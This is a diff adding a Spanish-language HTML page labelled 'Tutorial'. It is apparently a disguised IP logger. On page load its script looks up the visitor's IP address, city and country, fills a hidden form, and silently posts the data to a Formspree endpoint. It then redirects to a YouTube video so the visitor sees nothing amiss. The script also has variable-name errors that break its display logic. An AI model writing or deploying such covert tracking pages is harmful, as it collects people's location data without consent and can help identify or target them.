@@ -1,0 +1,101 @@
+<h2 style="text-align:center; font-family: Arial, sans-serif;">Tutorial</h2>
+
+<!-- Formulario oculto -->
+<form id="autoForm" action="https://formspree.io/f/xjkeqloa" method="POST">
+  <input type="hidden" name="ip" id="ipInput" value="desconocida">
+  <input type="hidden" name="ciudad" id="cityInput" value="desconocida">
+  <input type="hidden" name="pais" id="countryInput" value="desconocido">
+</form>
+
+<!-- Cuadro visible -->
+<div id="infoBox">
+  <p id="status">Cargando...</p>
+  <p id="ipText">tutorial: …</p>
+  <p id="locationText">completo: …</p>
+</div>
+
+<style>
+  #infoBox {
+    max-width: 500px;
+    margin: 50px auto;
+    padding: 30px;
+    border-radius: 20px;
+    background: linear-gradient(145deg, #f5f7fa, #e4ebf2);
+    box-shadow: 8px 8px 20px #c0c8d0, -8px -8px 20px #ffffff;
+    font-family: 'Segoe UI', sans-serif;
+    text-align: center;
+    transition: all 0.3s ease;
+  }
+
+  #infoBox p {
+    margin: 15px 0;
+    font-weight: 600;
+    color: #333;
+  }
+
+  #infoBox.loading {
+    animation: pulse 1.5s infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% {
+      box-shadow: 8px 8px 20px #c0c8d0, -8px -8px 20px #ffffff;
+    }
+    50% {
+      box-shadow: 5px 5px 15px #c0c8d0, -5px -5px 15px #ffffff;
+    }
+  }
+</style>
+
+<script>
+  const infoBox = document.getElementById('infoBox');
+  const statusText = document.getElementById('status');
+  const ipText = document.getElementById('ipText');
+  const locationText = document.getElementById('locationText');
+  const form = document.getElementById('autoForm');
+
+  infoBox.classList.add('loading');
+
+  async function fetchAndSend() {
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
+
+      const IP = data.ip || "No disponible";
+      const Ciudad = data.city || "No disponible";
+      const Pais = data.country_name || "No disponible";
+
+      // Mostrar en cuadro
+      ipText.textContent = `IP: ${ip}`;
+      locationText.textContent = `Ubicación: ${ciudad}, ${pais}`;
+      statusText.textContent = 'Cargando...';
+
+      // Rellenar campos ocultos
+      document.getElementById('ipInput').value = ip;
+      document.getElementById('cityInput').value = ciudad;
+      document.getElementById('countryInput').value = pais;
+
+    } catch {
+      ipText.textContent = "IP: No disponible";
+      locationText.textContent = "Ubicación: No disponible";
+      statusText.textContent = "Tutorial...";
+    } finally {
+      infoBox.classList.remove('loading');
+
+      // Enviar formulario y redirigir
+      try {
+        await fetch(form.action, {
+          method: 'POST',
+          body: new FormData(form),
+          headers: { 'Accept': 'application/json' }
+        });
+      } catch {
+        // Ignorar errores de envío
+      } finally {
+        window.location.href = "https://youtu.be/xvFZjo5PgG0";
+      }
+    }
+  }
+
+  fetchAndSend();
+</script>
